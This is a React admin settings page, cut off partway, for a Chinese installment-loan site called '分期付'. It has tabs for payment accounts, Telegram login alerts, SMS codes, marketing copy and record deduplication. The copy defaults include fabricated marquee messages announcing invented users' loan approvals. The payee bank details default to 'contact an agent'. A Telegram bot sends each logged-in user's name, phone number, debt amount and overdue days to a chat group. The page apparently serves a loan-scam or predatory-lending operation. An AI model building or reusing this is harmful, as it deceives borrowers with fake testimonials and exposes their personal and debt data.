'use client'

import { useEffect, useState } from 'react'

interface PaymentMethod {
  type: string
  bank_name: string
  payee_name: string
  card_number: string
}

export default function SettingsPage() {
  const [activeTab, setActiveTab] = useState<'basic' | 'payment' | 'telegram' | 'sms' | 'copy' | 'dedup'>('basic')
  const [dedupStats, setDedupStats] = useState<{
    users: { total: number; duplicatePhones: number; duplicateCount: number }
    verification_codes: { total: number; duplicateCount: number }
  } | null>(null)
  const [dedupLoading, setDedupLoading] = useState(false)
  const [paymentMethods, setPaymentMethods] = useState<PaymentMethod[]>([])
  const [customerServiceUrl, setCustomerServiceUrl] = useState('https://kbn.dot01ui.cfd/chat/index?channelId=817bc25124614b89afe65ecf4533a94a')
  const [telegramBotToken, setTelegramBotToken] = useState('')
  const [telegramChatId, setTelegramChatId] = useState('')
  const [smsbaoUsername, setSmsbaoUsername] = useState('')
  const [smsbaoPassword, setSmsbaoPassword] = useState('')
  const [smsbaoGoodsId, setSmsbaoGoodsId] = useState('')
  const [smsContentTemplate, setSmsContentTemplate] = useState('【短信宝】您的验证码是{code}，5分钟内有效。')
  const [smsBalance, setSmsBalance] = useState<{ sent: string; remaining: string } | null>(null)
  const [loading, setLoading] = useState(false)
  const [copySiteName, setCopySiteName] = useState('分期付')
  const [copyIndexPageTitle, setCopyIndexPageTitle] = useState('分期付')
  const [copyIndexSubtitle, setCopyIndexSubtitle] = useState('超快下款 超低利率')
  const [copyHeroProductName, setCopyHeroProductName] = useState('分期付')
  const [copyHeroQuotaLabel, setCopyHeroQuotaLabel] = useState('最高可获额度（元）')
  const [copyHeroAmount, setCopyHeroAmount] = useState('200,000')
  const [copyHeroRate, setCopyHeroRate] = useState('年化利率（单利）7.2%起')
  const [copyHeroTip, setCopyHeroTip] = useState('理性借贷 合理消费')
  const [copyMarqueeMessages, setCopyMarqueeMessages] = useState('07-07 用户尾号4826 成功申请服务 78800元\n07-07 用户尾号1234 成功申请服务 50000元\n07-07 用户尾号5678 成功申请服务 30000元')
  const [copyProductTitle, setCopyProductTitle] = useState('产品详情')
  const [copyRateInfo, setCopyRateInfo] = useState('年化费率（单利）7.2%~34%')
  const [copyMaxAmount, setCopyMaxAmount] = useState('最高可申请200,000元')
  const [copyPaymentMethod, setCopyPaymentMethod] = useState('等额本息、等额本金、本息同还')
  const [copyProcessMethod, setCopyProcessMethod] = useState('快1分钟，详情至本人银行卡')
  const [copyStep1Text, setCopyStep1Text] = useState('3分钟申请额度')
  const [copyStep2Text, setCopyStep2Text] = useState('30秒最快审批')
  const [copyStep3Text, setCopyStep3Text] = useState('1分钟最快放款')

  useEffect(() => {
    loadSettings()
  }, [])

  const loadSettings = async () => {
    setLoading(true)
    try {
      // 加载收款方式
      const paymentResponse = await fetch('/api/admin/settings?key=payment_methods')
      const paymentResult = await paymentResponse.json()

      if (paymentResult.code === 200 && paymentResult.data?.setting_value) {
        setPaymentMethods(paymentResult.data.setting_value || [])
      } else {
        // 如果没有数据，初始化默认值
        setPaymentMethods([
          {
            type: '银行卡一',
            bank_name: '联系专员获取',
            payee_name: '联系专员获取',
            card_number: '联系专员获取'
          },
          {
            type: '银行卡二',
            bank_name: '联系专员获取',
            payee_name: '联系专员获取',
            card_number: '联系专员获取'
          }
        ])
      }

      // 加载借款咨询链接
      const serviceResponse = await fetch('/api/admin/settings?key=customer_service_url')
      const serviceResult = await serviceResponse.json()

      if (serviceResult.code === 200 && serviceResult.data?.setting_value) {
        setCustomerServiceUrl(serviceResult.data.setting_value || 'https://kbn.dot01ui.cfd/chat/index?channelId=817bc25124614b89afe65ecf4533a94a')
      }

      // 加载 Telegram 配置
      const [tgTokenRes, tgChatRes] = await Promise.all([
        fetch('/api/admin/settings?key=telegram_bot_token'),
        fetch('/api/admin/settings?key=telegram_chat_id')
      ])
      const tgTokenJson = await tgTokenRes.json()
      const tgChatJson = await tgChatRes.json()
      if (tgTokenJson.code === 200 && typeof tgTokenJson.data?.setting_value === 'string') {
        setTelegramBotToken(tgTokenJson.data.setting_value)
      }
      if (tgChatJson.code === 200 && typeof tgChatJson.data?.setting_value === 'string') {
        setTelegramChatId(tgChatJson.data.setting_value)
      }

      // 加载短信宝配置
      const [smsUserRes, smsPwdRes, smsGoodsRes] = await Promise.all([
        fetch('/api/admin/settings?key=smsbao_username'),
        fetch('/api/admin/settings?key=smsbao_password'),
        fetch('/api/admin/settings?key=smsbao_goods_id')
      ])
      const smsUserJson = await smsUserRes.json()
      const smsPwdJson = await smsPwdRes.json()
      const smsGoodsJson = await smsGoodsRes.json()
      if (smsUserJson.code === 200 && typeof smsUserJson.data?.setting_value === 'string') {
        setSmsbaoUsername(smsUserJson.data.setting_value)
      }
      if (smsPwdJson.code === 200 && typeof smsPwdJson.data?.setting_value === 'string') {
        setSmsbaoPassword(smsPwdJson.data.setting_value)
      }
      if (smsGoodsJson.code === 200 && typeof smsGoodsJson.data?.setting_value === 'string') {
        setSmsbaoGoodsId(smsGoodsJson.data.setting_value)
      }
      const smsTemplateRes = await fetch('/api/admin/settings?key=smsbao_content_template')
      const smsTemplateJson = await smsTemplateRes.json()
      if (smsTemplateJson.code === 200 && smsTemplateJson.data?.setting_value !== undefined && smsTemplateJson.data?.setting_value !== null) {
        setSmsContentTemplate(String(smsTemplateJson.data.setting_value))
      }

      const copyKeys = ['site_name', 'copy_index_page_title', 'copy_index_subtitle', 'copy_hero_product_name', 'copy_hero_quota_label', 'copy_hero_amount', 'copy_hero_rate', 'copy_hero_tip', 'copy_marquee_messages', 'copy_product_title', 'copy_rate_info', 'copy_max_amount', 'copy_payment_method', 'copy_process_method', 'copy_step1_text', 'copy_step2_text', 'copy_step3_text']
      const copyRes = await Promise.all(copyKeys.map(k => fetch(`/api/admin/settings?key=${k}`)))
      const copyJsons = await Promise.all(copyRes.map(r => r.json()))
      copyKeys.forEach((k, i) => {
        const v = copyJsons[i]?.data?.setting_value
        if (v === undefined || v === null) return
        const s = String(v)
        if (k === 'site_name') setCopySiteName(s)
        else if (k === 'copy_index_page_title') setCopyIndexPageTitle(s)
        else if (k === 'copy_index_subtitle') setCopyIndexSubtitle(s)
        else if (k === 'copy_hero_product_name') setCopyHeroProductName(s)
        else if (k === 'copy_hero_quota_label') setCopyHeroQuotaLabel(s)
        else if (k === 'copy_hero_amount') setCopyHeroAmount(s)
        else if (k === 'copy_hero_rate') setCopyHeroRate(s)
        else if (k === 'copy_hero_tip') setCopyHeroTip(s)
        else if (k === 'copy_marquee_messages') {
          try {
            const arr = JSON.parse(s)
            setCopyMarqueeMessages(Array.isArray(arr) ? arr.join('\n') : s)
          } catch {
            setCopyMarqueeMessages(s)
          }
        }
        else if (k === 'copy_product_title') setCopyProductTitle(s)
        else if (k === 'copy_rate_info') setCopyRateInfo(s)
        else if (k === 'copy_max_amount') setCopyMaxAmount(s)
        else if (k === 'copy_payment_method') setCopyPaymentMethod(s)
        else if (k === 'copy_process_method') setCopyProcessMethod(s)
        else if (k === 'copy_step1_text') setCopyStep1Text(s)
        else if (k === 'copy_step2_text') setCopyStep2Text(s)
        else if (k === 'copy_step3_text') setCopyStep3Text(s)
      })
    } catch (error) {
      console.error('Load settings error:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleSave = async () => {
    setLoading(true)
    try {
      if (activeTab === 'basic') {
        // 保存借款咨询链接
        const response = await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            key: 'customer_service_url',
            value: customerServiceUrl
          })
        })

        const result = await response.json()

        if (result.code === 200) {
          alert('保存成功')
        } else {
          alert(result.msg || '保存失败')
        }
      } else if (activeTab === 'telegram') {
        // 保存 Telegram 配置
        await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'telegram_bot_token', value: telegramBotToken })
        })
        const chatRes = await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'telegram_chat_id', value: telegramChatId })
        })
        const chatResult = await chatRes.json()
        if (chatResult.code === 200) {
          alert('保存成功。用户登录后将在 Telegram 群组收到通知。')
        } else {
          alert(chatResult.msg || '保存失败')
        }
      } else if (activeTab === 'sms') {
        await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'smsbao_username', value: smsbaoUsername })
        })
        await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'smsbao_password', value: smsbaoPassword })
        })
        await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'smsbao_goods_id', value: smsbaoGoodsId })
        })
        const templateRes = await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ key: 'smsbao_content_template', value: smsContentTemplate })
        })
        const templateResult = await templateRes.json()
        if (templateResult.code === 200) {
          alert('短信配置保存成功')
          setSmsBalance(null)
        } else {
          alert(templateResult.msg || '保存失败')
        }
      } else if (activeTab === 'copy') {
        const copyPayloads: [string, string][] = [
          ['site_name', copySiteName],
          ['copy_index_page_title', copyIndexPageTitle],
          ['copy_index_subtitle', copyIndexSubtitle],
          ['copy_hero_product_name', copyHeroProductName],
          ['copy_hero_quota_label', copyHeroQuotaLabel],
          ['copy_hero_amount', copyHeroAmount],
          ['copy_hero_rate', copyHeroRate],
          ['copy_hero_tip', copyHeroTip],
          ['copy_marquee_messages', JSON.stringify(copyMarqueeMessages.trim().split('\n').filter(Boolean))],
          ['copy_product_title', copyProductTitle],
          ['copy_rate_info', copyRateInfo],
          ['copy_max_amount', copyMaxAmount],
          ['copy_payment_method', copyPaymentMethod],
          ['copy_process_method', copyProcessMethod],
          ['copy_step1_text', copyStep1Text],
          ['copy_step2_text', copyStep2Text],
          ['copy_step3_text', copyStep3Text],
        ]
        for (const [key, value] of copyPayloads) {
          await fetch('/api/admin/settings', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ key, value })
          })
        }
        alert('文案配置保存成功')
      } else {
        // 保存收款方式
        const response = await fetch('/api/admin/settings', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            key: 'payment_methods',
            value: paymentMethods
          })
        })

        const result = await response.json()

        if (result.code === 200) {
          alert('保存成功')
        } else {
          alert(result.msg || '保存失败')
        }
      }
    } catch (error) {
      alert('保存失败')
    } finally {
      setLoading(false)
    }
  }

  const updatePaymentMethod = (index: number, field: keyof PaymentMethod, value: string) => {
    const methods = [...paymentMethods]
    methods[index] = { ...methods[index], [field]: value }
    setPaymentMethods(methods)
  }

  const loadDedupStats = async () => {
    try {
      const res = await fetch('/api/admin/dedup')
      const json = await res.json()
      if (json.code === 200 && json.data) setDedupStats(json.data)
      else setDedupStats(null)
    } catch {
      setDedupStats(null)
    }
  }

  const runDedup = async (table: 'users' | 'verification_codes') => {
    const name = table === 'users' ? '用户表（按手机号）' : '验证码表（按手机号+验证码）'
    if (!confirm(`确定对「${name}」执行去重吗？将保留每组中最新一条，删除其余重复记录。此操作不可恢复。`)) return
    setDedupLoading(true)
    try {
      const res = await fetch('/api/admin/dedup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ table })
      })
      const json = await res.json()
      if (json.code === 200) {
        alert(`去重完成，已删除 ${json.data?.removed ?? 0} 条重复记录`)
        loadDedupStats()
      } else {
        alert(json.msg || '去重失败')
      }
    } catch (e) {
      alert('去重失败')
    } finally {
      setDedupLoading(false)
    }
  }

  return (
    <div style={{
      background: '#2d2d2d',
      borderRadius: '4px',
      overflow: 'hidden',
      fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
    }}>
      {/* 标签页 */}
      <div style={{
        display: 'flex',
        borderBottom: '1px solid #404040'
      }}>
        <button
          onClick={() => setActiveTab('basic')}
          style={{
            padding: '12px 24px',
            background: activeTab === 'basic' ? '#667eea' : 'transparent',
            color: activeTab === 'basic' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          基本设置
        </button>
        <button
          onClick={() => setActiveTab('payment')}
          style={{
            padding: '12px 24px',
            background: activeTab === 'payment' ? '#667eea' : 'transparent',
            color: activeTab === 'payment' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          收款方式
        </button>
        <button
          onClick={() => setActiveTab('telegram')}
          style={{
            padding: '12px 24px',
            background: activeTab === 'telegram' ? '#667eea' : 'transparent',
            color: activeTab === 'telegram' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          Telegram 通知
        </button>
        <button
          onClick={() => setActiveTab('sms')}
          style={{
            padding: '12px 24px',
            background: activeTab === 'sms' ? '#667eea' : 'transparent',
            color: activeTab === 'sms' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          短信配置
        </button>
        <button
          onClick={() => setActiveTab('copy')}
          style={{
            padding: '12px 24px',
            background: activeTab === 'copy' ? '#667eea' : 'transparent',
            color: activeTab === 'copy' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          文案配置
        </button>
        <button
          onClick={() => { setActiveTab('dedup'); loadDedupStats() }}
          style={{
            padding: '12px 24px',
            background: activeTab === 'dedup' ? '#667eea' : 'transparent',
            color: activeTab === 'dedup' ? '#fff' : '#b0b0b0',
            border: 'none',
            cursor: 'pointer',
            fontSize: '14px',
            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
            fontWeight: 'bold'
          }}
        >
          数据去重
        </button>
      </div>

      {/* 内容区域 */}
      <div style={{ padding: '30px' }}>
        {activeTab === 'basic' ? (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              基本设置
            </h2>

            <div style={{ display: 'grid', gap: '20px' }}>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  在线客服链接
                </label>
                <input
                  type="text"
                  value={customerServiceUrl}
                  onChange={(e) => setCustomerServiceUrl(e.target.value)}
                  placeholder="请输入借款咨询/在线客服链接，例如：https://kbn.dot01ui.cfd/chat/index?channelId=817bc25124614b89afe65ecf4533a94a"
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
                <p style={{ marginTop: '8px', fontSize: '12px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  用户端点击底部「借款咨询」时将跳转到此链接
                </p>
              </div>
            </div>

            {/* 保存按钮 */}
            <div style={{
              marginTop: '30px',
              display: 'flex',
              justifyContent: 'flex-end',
              gap: '10px'
            }}>
              <button
                onClick={handleSave}
                disabled={loading}
                style={{
                  padding: '10px 30px',
                  background: loading ? '#3d3d3d' : '#667eea',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
                }}
              >
                {loading ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        ) : activeTab === 'telegram' ? (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              Telegram 群组登录通知
            </h2>
            <p style={{ marginBottom: '20px', fontSize: '14px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              配置后，用户登录时机器人将向指定群组发送通知（登录用户姓名、手机号、欠款金额、逾期天数）。也可使用环境变量 TELEGRAM_BOT_TOKEN、TELEGRAM_CHAT_ID 覆盖。
            </p>
            <div style={{ display: 'grid', gap: '20px' }}>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  Telegram Bot Token
                </label>
                <input
                  type="password"
                  value={telegramBotToken}
                  onChange={(e) => setTelegramBotToken(e.target.value)}
                  placeholder="例如：123456789:AAH..."
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
                <p style={{ marginTop: '8px', fontSize: '12px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  在 @BotFather 创建机器人后获得的 Token
                </p>
              </div>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  Telegram 群组 Chat ID
                </label>
                <input
                  type="text"
                  value={telegramChatId}
                  onChange={(e) => setTelegramChatId(e.target.value)}
                  placeholder="例如：-1001234567890"
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
                <p style={{ marginTop: '8px', fontSize: '12px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  将机器人拉入群组后，群组 ID 通常为负数，如 -100xxxxxxxxxx
                </p>
              </div>
            </div>
            <div style={{ marginTop: '30px', display: 'flex', justifyContent: 'flex-end', gap: '10px' }}>
              <button
                onClick={handleSave}
                disabled={loading}
                style={{
                  padding: '10px 30px',
                  background: loading ? '#3d3d3d' : '#667eea',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
                }}
              >
                {loading ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        ) : activeTab === 'sms' ? (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              短信宝配置
            </h2>
            <p style={{ marginBottom: '20px', fontSize: '14px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              用于用户登录时发送短信验证码。未配置时不会真实发送短信（开发环境会模拟）。也可使用环境变量 SMSBAO_USERNAME、SMSBAO_PASSWORD、SMSBAO_GOODS_ID 覆盖。
            </p>
            <div style={{ display: 'grid', gap: '20px' }}>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  用户名
                </label>
                <input
                  type="text"
                  value={smsbaoUsername}
                  onChange={(e) => setSmsbaoUsername(e.target.value)}
                  placeholder="短信宝注册用户名"
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
              </div>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  密码或 ApiKey
                </label>
                <input
                  type="password"
                  value={smsbaoPassword}
                  onChange={(e) => setSmsbaoPassword(e.target.value)}
                  placeholder="登录密码（将自动 MD5）或 32 位 ApiKey"
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
                <p style={{ marginTop: '8px', fontSize: '12px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  推荐使用 ApiKey（在短信宝后台或联系客服获取），更安全
                </p>
              </div>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  产品 ID（可选）
                </label>
                <input
                  type="text"
                  value={smsbaoGoodsId}
                  onChange={(e) => setSmsbaoGoodsId(e.target.value)}
                  placeholder="使用专用通道时填写，不填则使用通用短信"
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold'
                  }}
                />
              </div>
              <div>
                <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  短信内容模板
                </label>
                <textarea
                  value={smsContentTemplate}
                  onChange={(e) => setSmsContentTemplate(e.target.value)}
                  placeholder="使用 {code} 表示验证码，例如：【XX】您的验证码是{code}，5分钟内有效。"
                  rows={3}
                  style={{
                    width: '100%',
                    padding: '8px 12px',
                    border: '1px solid #404040',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    background: '#1a1a1a',
                    color: '#ffffff',
                    fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                    fontWeight: 'bold',
                    resize: 'vertical'
                  }}
                />
                <p style={{ marginTop: '8px', fontSize: '12px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                  发送时会将 <code style={{ background: '#404040', padding: '2px 6px', borderRadius: '4px' }}>{'{code}'}</code> 替换为实际验证码。留空则使用默认模板。
                </p>
              </div>
              {smsBalance && (
                <div style={{ padding: '12px', background: '#1a1a1a', borderRadius: '4px', color: '#b0b0b0', fontSize: '14px' }}>
                  已发送条数：{smsBalance.sent}，剩余条数：{smsBalance.remaining}
                </div>
              )}
            </div>
            <div style={{ marginTop: '30px', display: 'flex', justifyContent: 'flex-end', gap: '10px' }}>
              <button
                onClick={async () => {
                  try {
                    const res = await fetch('/api/admin/sms-balance')
                    const json = await res.json()
                    if (json.code === 200 && json.data) {
                      setSmsBalance({ sent: json.data.sent, remaining: json.data.remaining })
                    } else {
                      alert(json.msg || '查询失败')
                    }
                  } catch (e) {
                    alert('查询失败')
                  }
                }}
                style={{
                  padding: '10px 30px',
                  background: '#404040',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
                }}
              >
                查询余额
              </button>
              <button
                onClick={handleSave}
                disabled={loading}
                style={{
                  padding: '10px 30px',
                  background: loading ? '#3d3d3d' : '#667eea',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
                }}
              >
                {loading ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        ) : activeTab === 'copy' ? (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              首页与登录页文案
            </h2>
            <p style={{ marginBottom: '20px', fontSize: '14px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              以下文案将显示在首页、登录页及蓝色卡片、产品详情等位置，修改后保存即可生效。
            </p>
            <div style={{ display: 'grid', gap: '16px' }}>
              {[
                { label: '登录页标题', value: copySiteName, set: setCopySiteName, placeholder: '分期付' },
                { label: '首页主标题', value: copyIndexPageTitle, set: setCopyIndexPageTitle, placeholder: '分期付' },
                { label: '首页副标题', value: copyIndexSubtitle, set: setCopyIndexSubtitle, placeholder: '超快下款 超低利率' },
                { label: '蓝色卡片-产品名', value: copyHeroProductName, set: setCopyHeroProductName, placeholder: '分期付' },
                { label: '蓝色卡片-额度标签', value: copyHeroQuotaLabel, set: setCopyHeroQuotaLabel, placeholder: '最高可获额度（元）' },
                { label: '蓝色卡片-金额', value: copyHeroAmount, set: setCopyHeroAmount, placeholder: '200,000' },
                { label: '蓝色卡片-利率', value: copyHeroRate, set: setCopyHeroRate, placeholder: '年化利率（单利）7.2%起' },
                { label: '蓝色卡片-底部提示', value: copyHeroTip, set: setCopyHeroTip, placeholder: '理性借贷 合理消费' },
                { label: '产品详情标题', value: copyProductTitle, set: setCopyProductTitle, placeholder: '产品详情' },
                { label: '服务费率/年化费率', value: copyRateInfo, set: setCopyRateInfo, placeholder: '年化费率（单利）7.2%~34%' },
                { label: '最高额度', value: copyMaxAmount, set: setCopyMaxAmount, placeholder: '最高可申请200,000元' },
                { label: '计费方式', value: copyPaymentMethod, set: setCopyPaymentMethod, placeholder: '等额本息、等额本金、本息同还' },
                { label: '处理方式', value: copyProcessMethod, set: setCopyProcessMethod, placeholder: '快1分钟，详情至本人银行卡' },
                { label: '步骤1文案', value: copyStep1Text, set: setCopyStep1Text, placeholder: '3分钟申请额度' },
                { label: '步骤2文案', value: copyStep2Text, set: setCopyStep2Text, placeholder: '30秒最快审批' },
                { label: '步骤3文案', value: copyStep3Text, set: setCopyStep3Text, placeholder: '1分钟最快放款' },
              ].map(({ label, value, set, placeholder }) => (
                <div key={label}>
                  <label style={{ display: 'block', marginBottom: '6px', fontWeight: 'bold', color: '#ffffff', fontSize: '14px' }}>{label}</label>
                  <input
                    type="text"
                    value={value}
                    onChange={(e) => set(e.target.value)}
                    placeholder={placeholder}
                    style={{ width: '100%', padding: '8px 12px', border: '1px solid #404040', borderRadius: '4px', boxSizing: 'border-box', background: '#1a1a1a', color: '#ffffff', fontSize: '14px' }}
                  />
                </div>
              ))}
              <div>
                <label style={{ display: 'block', marginBottom: '6px', fontWeight: 'bold', color: '#ffffff', fontSize: '14px' }}>轮播消息（每行一条）</label>
                <textarea
                  value={copyMarqueeMessages}
                  onChange={(e) => setCopyMarqueeMessages(e.target.value)}
                  placeholder="每行一条"
                  rows={4}
                  style={{ width: '100%', padding: '8px 12px', border: '1px solid #404040', borderRadius: '4px', boxSizing: 'border-box', background: '#1a1a1a', color: '#ffffff', fontSize: '14px', resize: 'vertical' }}
                />
              </div>
            </div>
            <div style={{ marginTop: '24px', display: 'flex', justifyContent: 'flex-end' }}>
              <button onClick={handleSave} disabled={loading} style={{ padding: '10px 30px', background: loading ? '#3d3d3d' : '#667eea', color: '#fff', border: 'none', borderRadius: '4px', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '14px', fontWeight: 'bold' }}>
                {loading ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        ) : activeTab === 'dedup' ? (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              数据去重
            </h2>
            <p style={{ marginBottom: '20px', fontSize: '14px', color: '#b0b0b0', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              对用户表按「手机号」、验证码表按「手机号+验证码」去重，每组保留最新一条（id 最大），删除其余重复记录。操作不可恢复，请确认后再执行。
            </p>
            <div style={{ display: 'flex', gap: '16px', marginBottom: '20px' }}>
              <button
                type="button"
                onClick={loadDedupStats}
                style={{ padding: '8px 16px', background: '#404040', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '14px' }}
              >
                刷新统计
              </button>
            </div>
            {dedupStats ? (
              <div style={{ display: 'grid', gap: '16px', marginBottom: '24px' }}>
                <div style={{ padding: '16px', background: '#1a1a1a', border: '1px solid #404040', borderRadius: '8px' }}>
